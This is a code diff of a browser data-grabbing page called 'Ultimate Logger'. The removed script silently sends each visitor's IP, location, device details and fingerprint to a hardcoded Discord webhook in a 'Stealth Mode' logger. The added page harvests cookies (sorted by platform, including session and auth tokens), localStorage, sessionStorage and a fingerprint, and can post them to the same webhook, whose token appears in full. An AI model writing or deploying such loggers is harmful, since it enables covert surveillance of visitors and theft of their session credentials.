@@ -1,185 +1,369 @@
-<script>
-  const webhookURL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Ultimate Logger - TXT Export & Cookie Categorization</title>
+    <style>
+        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
+        pre { background: #111; padding: 15px; overflow-x: auto; border-left: 3px solid #0f0; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-right: 10px; }
+        .download-btn { background: #00f; color: #fff; }
+        h1, h2 { color: #0f0; }
+    </style>
+</head>
+<body>
+    <h1>📡 ULTIMATE LOGGER + COOKIE CATEGORIZATION</h1>
+    <p>Collects everything, guesses cookie platforms, exports to .txt file.</p>
+    <button id="downloadBtn" class="download-btn">📥 Download .txt Report</button>
+    <button id="webhookBtn" style="background:#f00;">🚀 Send to Discord Webhook</button>
+    <h2>📄 Live Preview (First 2000 chars)</h2>
+    <pre id="output">Initializing...</pre>
 
-  function getDeviceType() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (/tablet|ipad|playbook|silk/i.test(ua)) return "Tablet";
-    if (/mobile|android|iphone|ipod/i.test(ua)) return "Mobile";
-    return "Desktop";
-  }
+    <script>
+        // ========== CONFIGURATION ==========
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-  function getBrowser() {
-    const ua = navigator.userAgent;
-    if (ua.includes("Firefox")) return "Firefox";
-    if (ua.includes("Edg")) return "Edge";
-    if (ua.includes("Chrome")) return "Chrome";
-    if (ua.includes("Safari")) return "Safari";
-    return "Unknown";
-  }
+        // ========== COOKIE CATEGORIZATION (by name patterns) ==========
+        function categorizeCookie(name, value) {
+            const lowerName = name.toLowerCase();
+            const lowerValue = value.toLowerCase();
+            
+            if (lowerName.includes("fb") || lowerName.includes("facebook") || lowerValue.includes("facebook"))
+                return "Facebook / Meta";
+            if (lowerName.includes("google") || lowerName.includes("_ga") || lowerName.includes("gmail") || lowerName.includes("youtube") || lowerValue.includes("google"))
+                return "Google / YouTube";
+            if (lowerName.includes("twitter") || lowerName.includes("tweet") || lowerValue.includes("twitter"))
+                return "Twitter (X)";
+            if (lowerName.includes("amazon") || lowerName.includes("amzn") || lowerValue.includes("amazon"))
+                return "Amazon";
+            if (lowerName.includes("reddit") || lowerValue.includes("reddit"))
+                return "Reddit";
+            if (lowerName.includes("instagram") || lowerValue.includes("instagram"))
+                return "Instagram";
+            if (lowerName.includes("linkedin") || lowerValue.includes("linkedin"))
+                return "LinkedIn";
+            if (lowerName.includes("discord") || lowerValue.includes("discord"))
+                return "Discord";
+            if (lowerName.includes("github") || lowerValue.includes("github"))
+                return "GitHub";
+            if (lowerName.includes("cloudflare") || lowerName.includes("__cf"))
+                return "Cloudflare";
+            if (lowerName.includes("session") || lowerName.includes("token") || lowerName.includes("auth") || lowerName.includes("jwt"))
+                return "Session / Auth (generic)";
+            if (lowerName.includes("ad") || lowerName.includes("track") || lowerName.includes("pixel"))
+                return "Advertising / Tracker";
+            return "Unknown / Other";
+        }
 
-  function getBrowserEngine() {
-    const ua = navigator.userAgent;
-    if (ua.includes("Gecko/") && !ua.includes("like Gecko")) return "Gecko";
-    if (ua.includes("AppleWebKit")) return "WebKit";
-    if (ua.includes("Blink")) return "Blink";
-    return "Unknown";
-  }
+        // ========== DATA COLLECTION ==========
+        function getAllCookies() {
+            const cookieString = document.cookie;
+            if (!cookieString) return [];
+            const cookies = cookieString.split(';').map(c => c.trim()).filter(c => c);
+            return cookies.map(c => {
+                const [name, ...rest] = c.split('=');
+                const value = rest.join('=');
+                return { name: name.trim(), value: value || "", platform: categorizeCookie(name, value) };
+            });
+        }
 
-  function getGPUInfo() {
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      return {
-        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable",
-        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unavailable"
-      };
-    } catch {
-      return { renderer: "Unavailable", vendor: "Unavailable" };
-    }
-  }
+        function getAllLocalStorage() {
+            try {
+                const items = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    try {
+                        items[key] = localStorage.getItem(key);
+                    } catch(e) { items[key] = "[Error reading]"; }
+                }
+                return items;
+            } catch(e) { return { error: e.message }; }
+        }
 
-  function getConnectionInfo() {
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    return conn
-      ? `Type: ${conn.effectiveType}, Downlink: ${conn.downlink}Mbps`
-      : "Unavailable";
-  }
+        function getAllSessionStorage() {
+            try {
+                const items = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    try {
+                        items[key] = sessionStorage.getItem(key);
+                    } catch(e) { items[key] = "[Error reading]"; }
+                }
+                return items;
+            } catch(e) { return { error: e.message }; }
+        }
 
-  function getFingerprint() {
-    const raw = [
-      navigator.userAgent,
-      navigator.language,
-      screen.width,
-      screen.height,
-      navigator.platform,
-      navigator.hardwareConcurrency,
-      navigator.deviceMemory
-    ].join("|");
-    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw)).then(buf =>
-      [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2, "0")).join("")
-    );
-  }
+        async function getAllIndexedDB() {
+            if (!window.indexedDB) return { error: "IndexedDB not supported" };
+            if (window.indexedDB.databases) {
+                try {
+                    return await window.indexedDB.databases();
+                } catch(e) { return { error: e.message }; }
+            }
+            return { info: "Cannot enumerate IndexedDB automatically" };
+        }
 
-  function detectAdBlock(callback) {
-    const ad = document.createElement("div");
-    ad.className = "adsbox";
-    ad.style.display = "none";
-    document.body.appendChild(ad);
-    setTimeout(() => {
-      const blocked = ad.offsetHeight === 0;
-      document.body.removeChild(ad);
-      callback(blocked ? "Yes" : "No");
-    }, 100);
-  }
+        function getGPU() {
+            try {
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                if (!gl) return { error: "WebGL unavailable" };
+                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                if (debugInfo) {
+                    return {
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+                    };
+                }
+                return { error: "WEBGL_debug_renderer_info not available" };
+            } catch(e) { return { error: e.message }; }
+        }
 
-  fetch("https://ipapi.co/json/")
-    .then(res => res.json())
-    .then(async data => {
-      const {
-        ip, city, region, country_name: country,
-        org: isp, timezone
-      } = data;
+        async function getBattery() {
+            if (!navigator.getBattery) return "Unavailable";
+            try {
+                const b = await navigator.getBattery();
+                return { level: Math.round(b.level * 100) + "%", charging: b.charging };
+            } catch(e) { return "Error"; }
+        }
 
-      const browser = getBrowser();
-      const engine = getBrowserEngine();
-      const userAgent = navigator.userAgent;
-      const deviceType = getDeviceType();
-      const screenSize = `${screen.width}x${screen.height}`;
-      const windowSize = `${window.innerWidth}x${window.innerHeight}`;
-      const orientation = screen.orientation?.type || "Unavailable";
-      const colorDepth = screen.colorDepth;
-      const gpu = getGPUInfo();
-      const connection = getConnectionInfo();
-      const fingerprint = await getFingerprint();
-      const language = navigator.language;
-      const platform = navigator.platform;
-      const concurrency = navigator.hardwareConcurrency || "Unknown";
-      const memory = navigator.deviceMemory || "Unknown";
-      const batteryLevel = await (navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}%`).catch(() => "Unavailable") || "Unknown");
-      const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
-      const cookies = navigator.cookieEnabled ? "Yes" : "No";
-      const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
-      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
-      const java = navigator.javaEnabled() ? "Yes" : "No";
-      const online = navigator.onLine ? "Online" : "Offline";
-      const fontCount = document.fonts ? document.fonts.size : "Unavailable";
-      const pageTitle = document.title;
-      const time = new Date().toString();
+        function getConnection() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return "Unavailable";
+            return {
+                effectiveType: conn.effectiveType,
+                downlink: conn.downlink,
+                rtt: conn.rtt,
+                saveData: conn.saveData
+            };
+        }
 
-      detectAdBlock(adBlocked => {
-        const payload = {
-          username: "Visitor Logger",
-          avatar_url: "https://i.imgur.com/2xVfCiq.png",
-          embeds: [{
-            title: "Visitor Intel Report",
-            color: 0x00b0f4,
-            description: `**IP Address:** \`${ip}\``,
-            fields: [
-              {
-                name: "Location",
-                value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}`,
-                inline: true
-              },
-              {
-                name: "Network",
-                value: `**ISP:** ${isp || "Unknown"}\n**Timezone:** ${timezone}\n**Connection:** ${connection}`,
-                inline: true
-              },
-              {
-                name: "System",
-                value: `**Type:** ${deviceType}\n**Platform:** ${platform}\n**CPU Threads:** ${concurrency}\n**RAM:** ${memory} GB`,
-                inline: true
-              },
-              {
-                name: "Display & GPU",
-                value: `**Resolution:** ${screenSize} @ ${colorDepth}bit\n**Window:** ${windowSize}\n**Touch:** ${touchSupport}\n**Orientation:** ${orientation}`,
-                inline: true
-              },
-              {
-                name: "GPU Details",
-                value: `**Renderer:** ${gpu.renderer}\n**Vendor:** ${gpu.vendor}`,
-                inline: true
-              },
-              {
-                name: "Browser",
-                value: `**Browser:** ${browser}\n**Engine:** ${engine}\n**Lang:** ${language}\n**Cookies:** ${cookies}\n**Java:** ${java}\n**DNT:** ${dnt}`,
-                inline: true
-              },
-              {
-                name: "Preferences",
-                value: `**Theme:** ${prefersDark}\n**Battery:** ${batteryLevel}\n**AdBlock:** ${adBlocked}\n**Fonts Loaded:** ${fontCount}`,
-                inline: true
-              },
-              {
-                name: "Fingerprint",
-                value: `\`${fingerprint.slice(0, 40)}...\` _(SHA-256 hash)_`,
-                inline: false
-              },
-              {
-                name: "Page Title",
-                value: pageTitle || "Unknown",
-                inline: false
-              },
-              {
-                name: "Time of Visit",
-                value: time,
-                inline: false
-              }
-            ],
-            footer: {
-              text: "Visitor Logger - Stealth Mode",
-              icon_url: "https://i.imgur.com/vyFjK0z.png"
-            },
-            timestamp: new Date().toISOString()
-          }]
+        function getPlugins() {
+            try {
+                return Array.from(navigator.plugins).map(p => p.name);
+            } catch(e) { return []; }
+        }
+
+        async function generateFingerprint() {
+            const gpu = getGPU();
+            const raw = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width, screen.height, screen.colorDepth,
+                navigator.hardwareConcurrency,
+                navigator.deviceMemory,
+                gpu.renderer || "",
+                gpu.vendor || "",
+                new Date().getTimezoneOffset()
+            ].join("|");
+            const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
+            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,"0")).join("");
+        }
+
+        async function collectAllData() {
+            const gpu = getGPU();
+            const cookies = getAllCookies();
+            const localStorage = getAllLocalStorage();
+            const sessionStorage = getAllSessionStorage();
+            const indexedDB = await getAllIndexedDB();
+            const fingerprint = await generateFingerprint();
+            
+            // Group cookies by platform
+            const platformGroups = {};
+            for (const cookie of cookies) {
+                if (!platformGroups[cookie.platform]) platformGroups[cookie.platform] = [];
+                platformGroups[cookie.platform].push(cookie);
+            }
+            
+            return {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                cookies: cookies,
+                cookiesGrouped: platformGroups,
+                localStorage: localStorage,
+                sessionStorage: sessionStorage,
+                indexedDB: indexedDB,
+                navigator: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    onLine: navigator.onLine
+                },
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    orientation: screen.orientation?.type || "n/a"
+                },
+                gpu: gpu,
+                battery: await getBattery(),
+                connection: getConnection(),
+                plugins: getPlugins(),
+                fingerprint: fingerprint,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        // ========== GENERATE .TXT REPORT ==========
+        async function generateTextReport(data) {
+            let report = "=".repeat(80) + "\n";
+            report += "          ULTIMATE PRIVATE LOGGER REPORT\n";
+            report += "=".repeat(80) + "\n\n";
+            report += `Generated: ${data.timestamp}\n`;
+            report += `Page URL: ${data.url}\n`;
+            report += `Referrer: ${data.referrer || "(none)"}\n`;
+            report += `Timezone: ${data.timezone}\n\n`;
+            
+            // COOKIES with platform categorization
+            report += "-" .repeat(80) + "\n";
+            report += "🍪 COOKIES (by platform)\n";
+            report += "-" .repeat(80) + "\n";
+            for (const [platform, cookies] of Object.entries(data.cookiesGrouped)) {
+                report += `\n[${platform}] (${cookies.length} cookies)\n`;
+                for (const cookie of cookies) {
+                    report += `  • ${cookie.name} = ${cookie.value.length > 100 ? cookie.value.substring(0,100)+"..." : cookie.value}\n`;
+                }
+            }
+            if (data.cookies.length === 0) report += "\nNo cookies found.\n";
+            
+            // LocalStorage
+            report += "\n" + "-".repeat(80) + "\n";
+            report += "💾 LOCALSTORAGE\n";
+            report += "-".repeat(80) + "\n";
+            for (const [key, val] of Object.entries(data.localStorage)) {
+                let valueStr = typeof val === 'string' ? val : JSON.stringify(val);
+                report += `${key} = ${valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr}\n`;
+            }
+            
+            // SessionStorage
+            report += "\n" + "-".repeat(80) + "\n";
+            report += "📦 SESSIONSTORAGE\n";
+            report += "-".repeat(80) + "\n";
+            for (const [key, val] of Object.entries(data.sessionStorage)) {
+                let valueStr = typeof val === 'string' ? val : JSON.stringify(val);
+                report += `${key} = ${valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr}\n`;
+            }
+            
+            // IndexedDB
+            report += "\n" + "-".repeat(80) + "\n";
+            report += "🗃️ INDEXEDDB DATABASES\n";
+            report += "-".repeat(80) + "\n";
+            if (Array.isArray(data.indexedDB)) {
+                for (const db of data.indexedDB) {
+                    report += `Name: ${db.name}, Version: ${db.version}\n`;
+                }
+            } else {
+                report += JSON.stringify(data.indexedDB, null, 2);
+            }
+            
+            // System & Browser
+            report += "\n" + "-".repeat(80) + "\n";
+            report += "🖥️ SYSTEM & BROWSER INFO\n";
+            report += "-".repeat(80) + "\n";
+            report += `User Agent: ${data.navigator.userAgent}\n`;
+            report += `Platform: ${data.navigator.platform}\n`;
+            report += `Language: ${data.navigator.language}\n`;
+            report += `CPU Cores: ${data.navigator.hardwareConcurrency || "unknown"}\n`;
+            report += `RAM: ${data.navigator.deviceMemory || "unknown"} GB\n`;
+            report += `Cookies Enabled: ${data.navigator.cookieEnabled}\n`;
+            report += `Do Not Track: ${data.navigator.doNotTrack}\n`;
+            report += `Online: ${data.navigator.onLine}\n`;
+            
+            // Screen
+            report += `\nScreen: ${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bit\n`;
+            report += `Pixel Ratio: ${data.screen.pixelRatio}\n`;
+            report += `Orientation: ${data.screen.orientation}\n`;
+            
+            // GPU
+            report += `\nGPU Renderer: ${data.gpu.renderer || "N/A"}\n`;
+            report += `GPU Vendor: ${data.gpu.vendor || "N/A"}\n`;
+            
+            // Battery & Connection
+            report += `\nBattery: ${JSON.stringify(data.battery)}\n`;
+            report += `Connection: ${JSON.stringify(data.connection)}\n`;
+            
+            // Plugins
+            report += `\nPlugins: ${data.plugins.join(", ") || "none"}\n`;
+            
+            // Fingerprint
+            report += `\n🔐 Fingerprint (SHA-256): ${data.fingerprint}\n`;
+            
+            report += "\n" + "=".repeat(80) + "\n";
+            report += "END OF REPORT\n";
+            report += "=".repeat(80);
+            
+            return report;
+        }
+
+        // ========== SEND TO WEBHOOK ==========
+        async function sendToWebhook(data) {
+            // Create a shorter summary for Discord embed due to 2000 char limit
+            const cookieSummary = data.cookies.slice(0, 15).map(c => `${c.name} (${c.platform})`).join(", ");
+            const payload = {
+                username: "🔥 TXT Logger",
+                avatar_url: "https://i.imgur.com/2xVfCiq.png",
+                embeds: [{
+                    title: "📦 Log Report Ready",
+                    description: `**URL:** ${data.url}\n**Cookies:** ${data.cookies.length} total\n**Platforms:** ${Object.keys(data.cookiesGrouped).join(", ")}`,
+                    color: 0xff0000,
+                    fields: [
+                        { name: "🍪 Sample Cookies", value: cookieSummary.slice(0, 1000) || "(none)", inline: false },
+                        { name: "🆔 Fingerprint", value: `\`${data.fingerprint}\``, inline: false },
+                        { name: "📥 Download", value: "Click the 'Download .txt Report' button on the page.", inline: false }
+                    ],
+                    footer: { text: "Full report exported to .txt" },
+                    timestamp: data.timestamp
+                }]
+            };
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // ========== MAIN ==========
+        let globalData = null;
+        const outputPre = document.getElementById("output");
+        
+        (async function() {
+            outputPre.innerText = "Collecting all data...";
+            globalData = await collectAllData();
+            outputPre.innerText = "✅ Data ready!\n\n" + JSON.stringify(globalData, null, 2).slice(0, 2000) + "...\n\nClick 'Download .txt Report' for full categorized export.";
+        })();
+        
+        document.getElementById("downloadBtn").onclick = async () => {
+            if (!globalData) {
+                alert("Data not ready yet, wait a second.");
+                return;
+            }
+            const reportText = await generateTextReport(globalData);
+            const blob = new Blob([reportText], { type: "text/plain" });
+            const link = document.createElement("a");
+            const url = URL.createObjectURL(blob);
+            link.href = url;
+            link.download = `logger_report_${new Date().toISOString().slice(0,19)}.txt`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
         };
-
-        fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      });
-    });
-</script>
+        
+        document.getElementById("webhookBtn").onclick = async () => {
+            if (!globalData) {
+                alert("Data not ready yet.");
+                return;
+            }
+            await sendToWebhook(globalData);
+            alert("Sent to Discord webhook!");
+        };
+    </script>
+</body>
+</html>
